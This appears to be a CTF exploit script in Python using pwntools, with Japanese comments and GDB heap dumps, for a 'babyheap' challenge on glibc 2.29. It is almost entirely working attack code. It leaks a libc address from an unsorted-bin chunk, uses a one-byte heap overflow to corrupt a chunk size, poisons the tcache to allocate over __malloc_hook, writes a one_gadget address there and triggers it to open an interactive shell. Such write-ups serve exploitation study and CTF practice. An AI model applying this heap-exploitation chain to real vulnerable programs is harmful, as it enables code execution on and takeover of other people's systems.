#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./babyheap_patched")
gdb.attach(target, gdbscript="b malloc")
glibc = ELF("libc-2.29.so")

def malloc(size, content):
    target.recvuntil("> ")
    target.sendline("M")
    target.recvuntil("> ")
    target.sendline(str(size))
    target.recvuntil("> ")
    target.sendline(content)

def free(index):
    target.recvuntil("> ")
    target.sendline("F")
    target.recvuntil("> \n")
    target.sendline(str(index))
    #print("Success free ", index)

def show(index):
    target.recvuntil("> ")
    target.sendline("S")
    target.recvuntil("> ")
    target.sendline(str(index))
    string = target.recvline()
    return string

for i in range(10):
    malloc(0xf8, b"a" * 0xf8)

for i in range(9, -1, -1):
    free(i)

"""
0x565285d35250: 0x00000000      0x00000000      0x00000301      0x00000000 #0
0x565285d35260: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35340: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35350: 0x00000000      0x00000000      0x00000201      0x00000000 #1
0x565285d35360: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35450: 0x00000000      0x00000000      0x00000101      0x00000000 #2
0x565285d35460: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35540: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35550: 0x00000300      0x00000000      0x00000100      0x00000000 #3
0x565285d35560: 0x85d35660      0x00005652      0x85d35010      0x00005652

0x565285d35640: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35650: 0x00000000      0x00000000      0x00000101      0x00000000 #4
0x565285d35660: 0x85d35760      0x00005652      0x85d35010      0x00005652

0x565285d35740: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35750: 0x00000000      0x00000000      0x00000101      0x00000000 #5
0x565285d35760: 0x85d35860      0x00005652      0x85d35010      0x00005652

0x565285d35840: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35850: 0x00000000      0x00000000      0x00000101      0x00000000 #6
0x565285d35860: 0x85d35960      0x00005652      0x85d35010      0x00005652

0x565285d35940: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35950: 0x00000000      0x00000000      0x00000101      0x00000000 #7
0x565285d35960: 0x85d35a60      0x00005652      0x85d35010      0x00005652

0x565285d35a40: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35a50: 0x00000000      0x00000000      0x00000101      0x00000000 #8
0x565285d35a60: 0x85d35b60      0x00005652      0x85d35010      0x00005652

0x565285d35b40: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35b50: 0x00000000      0x00000000      0x00000101      0x00000000 #9
0x565285d35b60: 0x00000000      0x00000000      0x85d35010      0x00005652

3~9はtcacheで管理される(解放した順番は9~3 先入れ後出しに留意),0~2はunsortbinで管理される
mallocは中身の初期化をしないので,unsortに確保されているチャンクに8バイト書き込んでleakさせる

[+] unsorted_bins[0]: fw=0x565285d35250, bk=0x565285d35250
 →   Chunk(addr=0x565285d35260, size=0x300, flags=PREV_INUSE)
"""

for i in range(9):
    malloc(0xf8, b"12345678")

"""
0x565285d35250: 0x00000000      0x00000000      0x00000101      0x00000000 #0 → #7
0x565285d35260: 0x34333231      0x38373635      0x2e158f90      0x00007f6a

0x565285d35350: 0x00000000      0x00000000      0x00000101      0x00000000 #1 → #8
0x565285d35360: 0x00000000      0x00000000      0x00000000      0x00000000

0x565285d35450: 0x00000000      0x00000000      0x00000101      0x00000000 #2
0x565285d35460: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35550: 0x00000100      0x00000000      0x00000100      0x00000000 #3 → #0
0x565285d35560: 0x34333231      0x38373635      0x00000000      0x00000000

0x565285d35650: 0x00000000      0x00000000      0x00000101      0x00000000 #4 → #1
0x565285d35660: 0x34333231      0x38373635      0x00000000      0x00000000

0x565285d35750: 0x00000000      0x00000000      0x00000101      0x00000000 #5 → #2
0x565285d35760: 0x34333231      0x38373635      0x00000000      0x00000000

0x565285d35850: 0x00000000      0x00000000      0x00000101      0x00000000 #6 → #3
0x565285d35860: 0x34333231      0x38373635      0x00000000      0x00000000

0x565285d35950: 0x00000000      0x00000000      0x00000101      0x00000000 #7 → #4
0x565285d35960: 0x34333231      0x38373635      0x00000000      0x00000000

0x565285d35a50: 0x00000000      0x00000000      0x00000101      0x00000000 #8 → #5
0x565285d35a60: 0x34333231      0x38373635      0x00000000      0x00000000

0x565285d35b50: 0x00000000      0x00000000      0x00000101      0x00000000 #9 → #6
0x565285d35b60: 0x34333231      0x38373635      0x00000000      0x00000000

tchacheで管理されている3~9から割り当てられるので上記のようになる
leakは7番目から行う
"""

leak = show(7)[8:14] + b"\x00" * 2
leak = u64(leak)
libc = leak - 0x1e4f90
print("libc is: ", hex(libc))

for i in range(8, -1 ,-1):
    free(i)

"""
0x565285d35250: 0x00000000      0x00000000      0x00000101      0x00000000 #0 → #7
0x565285d35260: 0x85d35360      0x00005652      0x85d35010      0x00005652

0x565285d35350: 0x00000000      0x00000000      0x00000101      0x00000000 #1 → #8
0x565285d35360: 0x00000000      0x00000000      0x85d35010      0x00005652

0x565285d35450: 0x00000000      0x00000000      0x00000301      0x00000000 #2
0x565285d35460: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35550: 0x00000100      0x00000000      0x00000100      0x00000000 #3 → #0
0x565285d35560: 0x00000000      0x00000000      0x00000000      0x00000000

0x565285d35650: 0x00000000      0x00000000      0x00000101      0x00000000 #4 → #1
0x565285d35660: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35750: 0x00000300      0x00000000      0x00000100      0x00000000 #5 → #2
0x565285d35760: 0x85d35860      0x00005652      0x85d35010      0x00005652

0x565285d35850: 0x00000000      0x00000000      0x00000101      0x00000000 #6 → #3
0x565285d35860: 0x85d35960      0x00005652      0x85d35010      0x00005652

0x565285d35950: 0x00000000      0x00000000      0x00000101      0x00000000 #7 → #4
0x565285d35960: 0x85d35a60      0x00005652      0x85d35010      0x00005652

0x565285d35a50: 0x00000000      0x00000000      0x00000101      0x00000000 #8 → #5
0x565285d35a60: 0x85d35b60      0x00005652      0x85d35010      0x00005652

0x565285d35b50: 0x00000000      0x00000000      0x00000101      0x00000000 #9 → #6
0x565285d35b60: 0x85d35260      0x00005652      0x85d35010      0x00005652

解放していなかった元#2と現在の#0 #1が纏められている
tchacheの先頭は0x565285d35760(現在の#2)

[+] unsorted_bins[0]: fw=0x565285d35450, bk=0x565285d35450
 →   Chunk(addr=0x565285d35460, size=0x300, flags=PREV_INUSE)
"""

malloc(0x8, b"1" * 0x8)
malloc(0x8, b"2" * 0x8)

free(0)
free(1)
"""
0x565285d35250: 0x00000000      0x00000000      0x00000101      0x00000000 #0 → #7
0x565285d35260: 0x85d35360      0x00005652      0x85d35010      0x00005652

0x565285d35350: 0x00000000      0x00000000      0x00000101      0x00000000 #1 → #8
0x565285d35360: 0x00000000      0x00000000      0x85d35010      0x00005652

0x565285d35450: 0x00000000      0x00000000      0x00000301      0x00000000 #2
0x565285d35460: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35550: 0x00000100      0x00000000      0x00000100      0x00000000 #3 → #0  
0x565285d35560: 0x00000000      0x00000000      0x00000000      0x00000000

0x565285d35650: 0x00000000      0x00000000      0x00000101      0x00000000 #4 → #1
0x565285d35660: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35750: 0x00000300      0x00000000      0x00000100      0x00000000 #5 → #2 → #0 
0x565285d35760: 0x00000000      0x00000000      0x00000000      0x00000000

0x565285d35850: 0x00000000      0x00000000      0x00000101      0x00000000 #6 → #3 → #1
0x565285d35860: 0x32323232      0x32323232      0x00000000      0x00000000

0x565285d35950: 0x00000000      0x00000000      0x00000101      0x00000000 #7 → #4
0x565285d35960: 0x85d35a60      0x00005652      0x85d35010      0x00005652

0x565285d35a50: 0x00000000      0x00000000      0x00000101      0x00000000 #8 → #5
0x565285d35a60: 0x85d35b60      0x00005652      0x85d35010      0x00005652

0x565285d35b50: 0x00000000      0x00000000      0x00000101      0x00000000 #9 → #6
0x565285d35b60: 0x85d35260      0x00005652      0x85d35010      0x00005652

本来なら0x565285d35550あたりだったかも 
ただunsortにまとめられたので開始位置は0x565285d35750(中身はfreeの前のmemsetで初期化されちった)
tchacheの先頭は0x565285d35960(まだfree前だからね)

[+] unsorted_bins[0]: fw=0x565285d35450, bk=0x565285d35450
 →   Chunk(addr=0x565285d35460, size=0x300, flags=PREV_INUSE)

free後

0x565285d35250: 0x00000000      0x00000000      0x00000101      0x00000000 #0 → #7
0x565285d35260: 0x85d35360      0x00005652      0x85d35010      0x00005652

0x565285d35350: 0x00000000      0x00000000      0x00000101      0x00000000 #1 → #8
0x565285d35360: 0x00000000      0x00000000      0x85d35010      0x00005652

0x565285d35450: 0x00000000      0x00000000      0x00000301      0x00000000 #2
0x565285d35460: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35550: 0x00000100      0x00000000      0x00000100      0x00000000 #3 → #0  
0x565285d35560: 0x00000000      0x00000000      0x00000000      0x00000000

0x565285d35650: 0x00000000      0x00000000      0x00000101      0x00000000 #4 → #1
0x565285d35660: 0x2e158ca0      0x00007f6a      0x2e158ca0      0x00007f6a

0x565285d35750: 0x00000300      0x00000000      0x00000100      0x00000000 #5 → #2 → #0
0x565285d35760: 0x85d35960      0x00005652      0x85d35010      0x00005652

0x565285d35850: 0x00000000      0x00000000      0x00000101      0x00000000 #6 → #3 → #1
0x565285d35860: 0x85d35760      0x00005652      0x85d35010      0x00005652

0x565285d35950: 0x00000000      0x00000000      0x00000101      0x00000000 #7 → #4
0x565285d35960: 0x85d35a60      0x00005652      0x85d35010      0x00005652

0x565285d35a50: 0x00000000      0x00000000      0x00000101      0x00000000 #8 → #5
0x565285d35a60: 0x85d35b60      0x00005652      0x85d35010      0x00005652

0x565285d35b50: 0x00000000      0x00000000      0x00000101      0x00000000 #9 → #6
0x565285d35b60: 0x85d35260      0x00005652      0x85d35010      0x00005652

freeは現在の#0 #1の順に解放している
ので先頭は0x565285d35860
"""

#malloc関数の1バイトのオーバーフローを使ってサイズを書き換える
"""
0x565285d35740: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35750: 0x00000300      0x00000000      0x00000100      0x00000000 #5 → #2 → #0 → #1
0x565285d35760: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35770: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35780: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35790: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357a0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357b0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357c0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357d0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357e0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357f0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35800: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35810: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35820: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35830: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35840: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35850: 0x34343434      0x34343434      0x00000181      0x00000000  #6 → #3 → #1 → #0
0x565285d35860: 0x33333333      0x33333333      0x00000000      0x00000000
0x565285d35870: 0x00000000      0x00000000      0x00000000      0x00000000

0x181なのはmalloc関数のサイズが0x101か0x181だから
0x565285d35858当たりが上書きされたポイント 
上のheap見ればわかるけどこの部分はすでに割り当てられているので
free(0)するとheapがオーバーフローする
"""
malloc(0x8, b"3" * 0x8)

malloc(0xf8, b"4" * 0xf8 + b"\x81")

free(0)

#アドレスは6byteなので残りの\x00はいらない だから[:6]
payload = b"5" * 0x100 + p64(libc + glibc.sym["__malloc_hook"])[:6]
malloc(0x174, payload)
"""
0x565285d35850: 0x34343434      0x34343434      0x00000181      0x00000000 #6 → #3 → #1 → #0 → #0
0x565285d35860: 0x00000000      0x00000000      0x85d35010      0x00005652
0x565285d35870: 0x00000000      0x00000000      0x00000000      0x00000000

0x565285d35940: 0x00000000      0x00000000      0x00000000      0x00000000
0x565285d35950: 0x00000000      0x00000000      0x00000101      0x00000000 #7 → #4
0x565285d35960: 0x85d35a60      0x00005652      0x85d35010      0x00005652
0x565285d35970: 0x00000000      0x00000000      0x00000000      0x00000000
オーバーフローされる0x565285d35960が次に割り当てられるtchache
Tcachebins[idx=239626822526128977, size=0x3535353535353530, count=2] 
←  Chunk(addr=0x565285d35960, size=0x3535353535353530, flags=PREV_INUSE|NON_MAIN_ARENA)  
←  Chunk(addr=0x7f6a2e158c30, size=0x7f6a2e00d8f0, flags=! PREV_INUSE)

つまりこの位置に攻撃したいアドレスを書き込めば,その次のチャンクはそのアドレスに割り当てられる
mallocが呼ばれた際にシェルを呼び出したいからmalloc_hookに割り当てられるように仕掛ける

0x565285d35750: 0x00000300      0x00000000      0x00000100      0x00000000
0x565285d35760: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35770: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35780: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35790: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357a0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357b0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357c0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357d0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357e0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d357f0: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35800: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35810: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35820: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35830: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35840: 0x34343434      0x34343434      0x34343434      0x34343434
0x565285d35850: 0x34343434      0x34343434      0x00000181      0x00000000
0x565285d35860: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35870: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35880: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35890: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d358a0: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d358b0: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d358c0: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d358d0: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d358e0: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d358f0: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35900: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35910: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35920: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35930: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35940: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35950: 0x35353535      0x35353535      0x35353535      0x35353535
0x565285d35960: 0x2e158c30      0x00007f6a      0x85d35010      0x00005652
↑malloc_hook
"""

malloc(0x10, b"12345678")
"""
malloc後のアドレス
$rax   : 0x00565285d35960  →  0x007f6a2e158c30  →  0x0000000000000000
0x7f6a2e158c30 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
これで次に割り当てられるのはmalloc_hookの位置になる
"""

shot = libc + 0xe2383
malloc(0x10, p64(shot)[:6])
#0x7f6a2e158c30 <__malloc_hook>: 0x00007f6a2e056383      0x0000000000000000

target.recvuntil("> ")
target.sendline("M")
target.recvuntil("> ")
target.sendline("10")

target.interactive()